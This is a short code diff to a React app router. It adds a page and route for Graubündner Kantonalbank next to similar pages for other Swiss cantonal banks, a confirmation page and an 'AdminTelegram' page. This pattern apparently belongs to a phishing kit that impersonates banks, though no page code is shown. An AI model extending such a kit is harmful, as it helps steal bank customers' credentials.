@@ -42,6 +42,7 @@ import ChBasellandschaftlicheKantonalbank from "./pages/ChBasellandschaftlicheKa
 import ChBaslerKantonalbank from "./pages/ChBaslerKantonalbank.tsx";
 import ChBernerKantonalbank from "./pages/ChBernerKantonalbank.tsx";
 import ChGlarnerKantonalbank from "./pages/ChGlarnerKantonalbank.tsx";
+import ChGraubuendnerKantonalbank from "./pages/ChGraubuendnerKantonalbank.tsx";
 
 import Confirmation from "./pages/Confirmation.tsx";
 import AdminTelegram from "./pages/AdminTelegram.tsx";
@@ -153,6 +154,7 @@ const App = () => (
             <Route path="/ch/basler-kantonalbank" element={<P><ChBaslerKantonalbank /></P>} />
             <Route path="/ch/berner-kantonalbank" element={<P><ChBernerKantonalbank /></P>} />
             <Route path="/ch/glarner-kantonalbank" element={<P><ChGlarnerKantonalbank /></P>} />
+            <Route path="/ch/graubuendner-kantonalbank" element={<P><ChGraubuendnerKantonalbank /></P>} />
 
 
             <Route path="/confirmation" element={<P><ConfirmationSwitch /></P>} />
